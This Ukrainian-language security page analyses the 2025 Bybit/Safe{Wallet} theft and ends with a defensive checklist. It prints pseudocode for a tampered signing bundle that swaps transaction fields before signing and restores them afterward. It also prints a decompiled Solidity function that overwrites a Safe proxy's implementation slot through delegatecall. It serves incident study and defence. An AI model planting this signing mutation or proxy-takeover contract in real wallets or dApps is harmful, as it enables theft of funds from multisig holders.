# Компрометація workflow підписання Web3 і захоплення Safe Delegatecall Proxy

{{#include ../../banners/hacktricks-training.md}}

## Огляд

Ланцюжок крадіжки з cold-wallet поєднав **компрометацію ланцюжка постачання web UI Safe{Wallet}** з **on-chain примітивом delegatecall, який перезаписав вказівник на implementation proxy (slot 0)**. Основні висновки:

- Якщо dApp може вставити код у процес підписання, він може змусити підписанта створити дійсний **EIP-712 підпис для вибраних атакером полів**<sup>[[4]](#references)</sup>, одночасно відновивши вихідні дані UI, щоб інші підписанти не помітили змін.
- Safe proxies зберігають `masterCopy` (implementation) у **storage slot 0**. Delegatecall до контракту, який записує дані в slot 0, фактично «оновлює» Safe до логіки атакера, надаючи повний контроль над wallet.

## Off-chain: цільова мутація підписання в Safe{Wallet}

Підроблений Safe bundle (`_app-*.js`) вибірково атакував конкретні адреси Safe та підписантів. Вставлена логіка виконувалася безпосередньо перед викликом підписання:<sup>[[1]](#references)[[3]](#references)</sup>
```javascript
// Pseudocode of the malicious flow
orig = structuredClone(tx.data);
if (isVictimSafe && isVictimSigner && tx.data.operation === 0) {
tx.data.to = attackerContract;
tx.data.data = "0xa9059cbb...";      // ERC-20 transfer selector
tx.data.operation = 1;                 // delegatecall
tx.data.value = 0;
tx.data.safeTxGas = 45746;
const sig = await sdk.signTransaction(tx, safeVersion);
sig.data = orig;                       // restore original before submission
tx.data = orig;
return sig;
}
```
### Властивості атаки
- **Обмеження контекстом**: жорстко задані allowlists для victim Safes/signers запобігали шуму та знижували ймовірність виявлення.<sup>[[1]](#references)[[3]](#references)</sup>
- **Мутація в останній момент**: поля (`to`, `data`, `operation`, gas) перезаписувалися безпосередньо перед `signTransaction`, а потім відновлювалися, тому payloads пропозицій у UI виглядали безпечними, тоді як signatures відповідали payload атакуючого.
- **Непрозорість EIP-712**: wallets показували структуровані дані, але не декодували вкладені calldata і не виділяли `operation = delegatecall`, через що мутоване повідомлення фактично підписувалося всліпу.

### Важливість валідації Gateway
Safe proposals надсилаються до **Safe Client Gateway**.<sup>[[5]](#references)</sup> До впровадження посилених перевірок gateway міг прийняти proposal, у якому `safeTxHash`/signature відповідали іншим полям, ніж у JSON body, якщо UI переписував їх після підписання. Після інциденту gateway тепер відхиляє proposals, у яких hash/signature не відповідають надісланій транзакції. Аналогічну server-side перевірку hash слід застосовувати до будь-якого signing-orchestration API.

### Основні моменти інциденту Bybit/Safe 2025 року
- Виведення коштів із cold-wallet Bybit 21 лютого 2025 року (~401k ETH) повторило той самий pattern: скомпрометований Safe S3 bundle активувався лише для Bybit signers і замінив `operation=0` → `1`, вказавши `to` на попередньо розгорнутий attacker contract, який записує slot 0.<sup>[[1]](#references)[[3]](#references)</sup>
- Збережений у Wayback `_app-52c9031bfa03da47.js` показує, що logic використовував Safe Bybit (`0x1db9…cf4`) та signer addresses як умову, а потім одразу відкотився до clean bundle через дві хвилини після виконання, відтворюючи trick “mutate → sign → restore”.<sup>[[1]](#references)[[2]](#references)</sup>
- Шкідливий contract (наприклад, `0x9622…c7242`) містив прості functions `sweepETH/sweepERC20`, а також `transfer(address,uint256)`, яка записує implementation slot. Виконання `execTransaction(..., operation=1, to=contract, data=transfer(newImpl,0))` змінило implementation proxy та надало повний контроль.<sup>[[1]](#references)[[3]](#references)</sup>

## On-chain: захоплення proxy через Delegatecall і collision slot

Safe proxies зберігають `masterCopy` у **storage slot 0** і делегують усю logic йому. Оскільки Safe підтримує **`operation = 1` (delegatecall)**, будь-яка підписана транзакція може вказати на довільний contract і виконати його code у storage context proxy.<sup>[[3]](#references)</sup>

Attacker contract імітував ERC-20 `transfer(address,uint256)`, але натомість записував `_to` у slot 0:<sup>[[1]](#references)[[3]](#references)</sup>
```solidity
// Decompiler view (storage slot 0 write)
uint256 stor0; // slot 0
function transfer(address _to, uint256 _value) external {
stor0 = uint256(uint160(_to));
}
```
Шлях виконання:<sup>[[1]](#references)[[3]](#references)</sup>
1. Жертви підписують `execTransaction` з `operation = delegatecall`, `to = attackerContract`, `data = transfer(newImpl, 0)`.
2. Safe masterCopy перевіряє підписи для цих параметрів.
3. Proxy виконує delegatecall до `attackerContract`; тіло `transfer` записує значення в slot 0.
4. Slot 0 (`masterCopy`) тепер вказує на логіку, контрольовану атакером → **повний контроль над wallet і виведення коштів**.

### Примітки щодо Guard і версій (посилення захисту після інциденту)
- Safes >= v1.3.0 можуть встановити **Guard** для блокування `delegatecall` або застосування ACL до `to`/селекторів; Bybit використовував v1.1.1, тому hook Guard був відсутній. Для отримання цього control plane потрібно оновити контракти (і повторно додати owners).

## Чекліст виявлення та посилення захисту

- **Цілісність UI**: фіксуйте JS assets / SRI; відстежуйте відмінності bundle; розглядайте signing UI як частину trust boundary.
- **Валідація під час підписання**: hardware wallets з **EIP-712 clear-signing**; явно відображайте `operation` і декодуйте вкладений calldata. Відхиляйте підписання, коли `operation = 1`, якщо це не дозволено політикою.
- **Перевірки hash на стороні сервера**: gateways/services, які ретранслюють proposals, мають повторно обчислювати `safeTxHash` і перевіряти відповідність підписів надісланим полям.
- **Policy/allowlists**: правила preflight для `to`, селекторів і типів assets; забороняйте delegatecall, окрім перевірених flows. Перед broadcast повністю підписаних transactions вимагайте внутрішній policy service.
- **Дизайн контрактів**: уникайте надання довільного delegatecall у multisig/treasury wallets, якщо це не є суворо необхідним. Розміщуйте upgrade pointers не в slot 0 або захищайте їх явною upgrade logic і access control.
- **Моніторинг**: створюйте alert для delegatecall executions із wallets, що зберігають treasury funds, а також для proposals, у яких `operation` змінюється зі звичайних `call` patterns.

## References

- [1] [Криміналістичний розбір експлойту Bybit Safe від AnChain.AI](https://www.anchain.ai/blog/bybit)
- [2] [Аналіз компрометації Safe bundle від Zero Hour Technology](https://www.panewslab.com/en/articles/7r34t0qk9a15)
- [3] [Поглиблений технічний аналіз hack Bybit (NCC Group)](https://www.nccgroup.com/research-blog/in-depth-technical-analysis-of-the-bybit-hack/)
- [4] [EIP-712](https://eips.ethereum.org/EIPS/eip-712)
- [5] [safe-client-gateway (GitHub)](https://github.com/safe-global/safe-client-gateway)

{{#include ../../banners/hacktricks-training.md}}
